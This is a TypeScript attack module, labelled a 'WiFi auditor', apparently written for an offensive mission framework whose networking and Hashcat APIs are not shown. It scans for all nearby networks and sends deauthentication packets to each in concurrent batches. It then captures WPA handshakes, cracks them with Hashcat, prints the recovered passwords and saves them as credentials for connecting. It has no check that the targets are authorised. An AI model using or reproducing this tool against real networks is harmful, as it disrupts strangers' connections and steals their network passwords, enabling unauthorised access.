// @ts-nocheck
// ============================================================================
// SECTION 1: Imports
// ============================================================================

import { UI, COLOR_PALETTE } from "../../lib/ui";
import { MissionManifest, ModuleResult, NewAsset } from "../../lib/types";

// ============================================================================
// SECTION 2: Module Metadata
// ============================================================================

export const meta = {
  name: "wifi",
  command: "wifi",
  description: "WiFi auditor - scan, crack all networks, and connect",
  requires: [],
  inputs: [],
  outputs: ["wifi_credentials"],
};

// ============================================================================
// SECTION 3: Core Logic (run function)
// ============================================================================

const CONCURRENT_ATTACKS = 10;
const DEAUTH_PACKETS = 10;

interface WiFiNetwork {
  bssid: string;
  ssid: string;
  signal: number;
  encryption?: string;
  cracked?: boolean;
  password?: string;
}

export async function run(
  mission: MissionManifest,
  ui: UI,
  args?: string[]
): Promise<ModuleResult> {
  ui.section("WiFi Auditor");
  ui.info("Initializing wireless audit...");

  // Step 1: Get monitor interface
  const interfaces = await Networking.Wifi.GetInterfaces();
  const monitorIface = interfaces.find((i) => i.monitor);

  if (!monitorIface) {
    ui.error("No monitor mode interface found. Enable monitor mode first.");
    return { success: false, data: { error: "No monitor interface" } };
  }

  ui.success(`Using interface: ${monitorIface.name}`);

  // Step 2: Scan networks
  ui.info("Scanning for WiFi networks...");
  const allNetworks = await Networking.Wifi.Scan(monitorIface.name);
  
  if (allNetworks.length === 0) {
    ui.error("No networks found");
    return { success: false, data: { results: [] } };
  }

  // Filter valid networks
  const networks: WiFiNetwork[] = allNetworks
    .filter((n) => n.bssid && n.ssid)
    .map((n) => ({
      bssid: n.bssid,
      ssid: n.ssid,
      signal: n.signal || 0,
      encryption: n.encryption || "WPA2",
    }));

  ui.success(`Found ${networks.length} networks`);
  ui.divider();

  // Step 3: Check for already cracked networks from mission
  const crackedFromHistory = getCrackedNetworksFromMission(mission);
  
  // Merge with discovered networks
  const mergedNetworks = networks.map((n) => {
    const cracked = crackedFromHistory.find((c) => c.bssid === n.bssid);
    if (cracked) {
      return { ...n, cracked: true, password: cracked.password };
    }
    return n;
  });

  // Step 4: Show current status
  const alreadyCracked = mergedNetworks.filter((n) => n.cracked);
  const toCrack = mergedNetworks.filter((n) => !n.cracked);

  if (alreadyCracked.length > 0) {
    ui.success(`${alreadyCracked.length} networks already cracked`);
    displayNetworksTable(ui, alreadyCracked, true);
  }

  if (toCrack.length > 0) {
    ui.info(`${toCrack.length} networks to crack`);
    displayNetworksTable(ui, toCrack, false);
  }

  // Step 5: Crack remaining networks
  let newlyCracked: WiFiNetwork[] = [];
  
  if (toCrack.length > 0) {
    ui.section("Cracking Phase");
    newlyCracked = await crackNetworks(ui, monitorIface.name, toCrack);
  }

  // Combine all cracked networks
  const allCracked = [...alreadyCracked, ...newlyCracked];

  if (allCracked.length === 0) {
    ui.error("No networks cracked. Cannot proceed to connection.");
    return { success: false, data: { cracked: 0, networks: networks.length } };
  }

  // Step 6: Display cracked networks with signal strength
  ui.section("Cracked Networks Available");
  displayCrackedNetworks(ui, allCracked);

  // Step 7: Prompt user to select network to connect
  const selection = await uiPrompt(ui, "\nSelect network index to connect (or 'q' to skip): ");
  
  if (selection.toLowerCase() === "q") {
    ui.info("Skipping connection phase");
    return buildResult(allCracked, networks.length);
  }

  const idx = parseInt(selection);
  if (isNaN(idx) || idx < 0 || idx >= allCracked.length) {
    ui.error("Invalid selection");
    return buildResult(allCracked, networks.length);
  }

  const selected = allCracked[idx];
  ui.success(`Selected: ${selected.ssid} (${selected.bssid})`);
  ui.info(`Password: ${selected.password}`);
  
  // Note: Connection would use Networking.Wifi.Connect if available
  // For now, we display credentials for manual connection
  ui.success("Credentials ready for connection");

  return buildResult(allCracked, networks.length, selected);
}

// ============================================================================
// SECTION 4: Helper Functions
// ============================================================================

function getCrackedNetworksFromMission(mission: MissionManifest): Array<{ bssid: string; ssid: string; password: string }> {
  // Look for WiFi credentials in mission history or assets
  const cracked: Array<{ bssid: string; ssid: string; password: string }> = [];
  
  // Check credentials for WiFi entries
  for (const cred of mission.assets.credentials) {
    if (cred.source.startsWith("wifi:")) {
      const parts = cred.source.split(":");
      if (parts.length >= 3) {
        cracked.push({
          bssid: parts[1],
          ssid: parts[2],
          password: cred.pass,
        });
      }
    }
  }
  
  return cracked;
}

function displayNetworksTable(ui: UI, networks: WiFiNetwork[], cracked: boolean): void {
  const rows = networks.map((n, i) => {
    const signalBar = getSignalBar(n.signal);
    return {
      "#": String(i),
      "SSID": n.ssid,
      "BSSID": n.bssid,
      "Signal": `${n.signal} ${signalBar}`,
      "Status": cracked && n.password ? "🔓 " + n.password : "🔒",
    };
  });

  ui.table(["#", "SSID", "BSSID", "Signal", "Status"], rows);
}

function displayCrackedNetworks(ui: UI, networks: WiFiNetwork[]): void {
  // Sort by signal strength (descending)
  const sorted = [...networks].sort((a, b) => b.signal - a.signal);
  
  const rows = sorted.map((n, i) => {
    const signalBar = getSignalBar(n.signal);
    const signalColor = n.signal >= 3 ? COLOR_PALETTE.green : 
                       n.signal >= 1 ? COLOR_PALETTE.yellow : COLOR_PALETTE.red;
    
    return {
      "#": String(i),
      "SSID": n.ssid.substring(0, 20),
      "BSSID": n.bssid,
      "Signal": `${n.signal} ${signalBar}`,
      "Password": n.password || "???",
    };
  });

  ui.table(["#", "SSID", "BSSID", "Signal", "Password"], rows, {
    rowColor: (row) => {
      const signal = parseInt(row.Signal as string) || 0;
      if (signal >= 3) return COLOR_PALETTE.green;
      if (signal >= 1) return COLOR_PALETTE.yellow;
      return COLOR_PALETTE.red;
    }
  });
}

function getSignalBar(signal: number): string {
  const bars = Math.max(0, Math.min(4, signal));
  return "█".repeat(bars) + "░".repeat(4 - bars);
}

async function crackNetworks(
  ui: UI,
  ifaceName: string,
  networks: WiFiNetwork[]
): Promise<WiFiNetwork[]> {
  const results: WiFiNetwork[] = [];
  const totalBatches = Math.ceil(networks.length / CONCURRENT_ATTACKS);

  for (let i = 0; i < networks.length; i += CONCURRENT_ATTACKS) {
    const batchNum = Math.floor(i / CONCURRENT_ATTACKS) + 1;
    const batch = networks.slice(i, i + CONCURRENT_ATTACKS);

    ui.info(`Batch ${batchNum}/${totalBatches}: Attacking ${batch.length} networks...`);

    const batchResults = await Promise.all(
      batch.map((n) => crackSingleNetwork(ifaceName, n, ui))
    );

    for (const result of batchResults) {
      if (result.password) {
        results.push(result);
        ui.success(`Cracked: ${result.ssid} → ${result.password}`);
      }
    }
  }

  ui.success(`Cracking complete: ${results.length}/${networks.length} cracked`);
  return results;
}

async function crackSingleNetwork(
  ifaceName: string,
  target: WiFiNetwork,
  ui: UI
): Promise<WiFiNetwork> {
  try {
    // Deauth
    await Networking.Wifi.Deauth(ifaceName, target.bssid, { packets: DEAUTH_PACKETS });
    
    // Capture handshake
    const pcapFile = await Networking.Wifi.CaptureHandshake(ifaceName, target.bssid);
    if (!pcapFile) {
      return { ...target, cracked: false };
    }

    // Crack with Hashcat
    let password: string | null = null;
    try {
      password = await Crypto.Hashcat.Decrypt(pcapFile);
    } catch {
      // Try alternative paths
      try {
        const cwd = await FileSystem.cwd();
        password = await Crypto.Hashcat.Decrypt(pcapFile, { cwd: cwd.absolutePath });
      } catch {
        // Failed
      }
    }

    // Cleanup pcap
    try {
      await FileSystem.Remove(pcapFile);
    } catch {
      // Ignore cleanup errors
    }

    if (password) {
      return { ...target, cracked: true, password };
    }
  } catch {
    // Ignore errors, return uncracked
  }

  return { ...target, cracked: false };
}

async function uiPrompt(ui: UI, message: string): Promise<string> {
  // Use global prompt if available, otherwise simulate
  if (typeof prompt === "function") {
    return prompt(message) || "";
  }
  return "";
}

function buildResult(
  cracked: WiFiNetwork[],
  totalNetworks: number,
  selected?: WiFiNetwork
): ModuleResult {
  const newAssets: NewAsset[] = cracked.map((n) => ({
    type: "credential",
    value: { user: "", pass: n.password, source: `wifi:${n.bssid}:${n.ssid}` },
    parent: n.bssid,
  }));

  return {
    success: cracked.length > 0,
    data: {
      cracked: cracked.length,
      total: totalNetworks,
      selected: selected || null,
      networks: cracked.map((n) => ({
        ssid: n.ssid,
        bssid: n.bssid,
        signal: n.signal,
        password: n.password,
      })),
    },
    newAssets,
  };
}

// ============================================================================
// SECTION 5: Default Export
// ============================================================================

export default { meta, run };
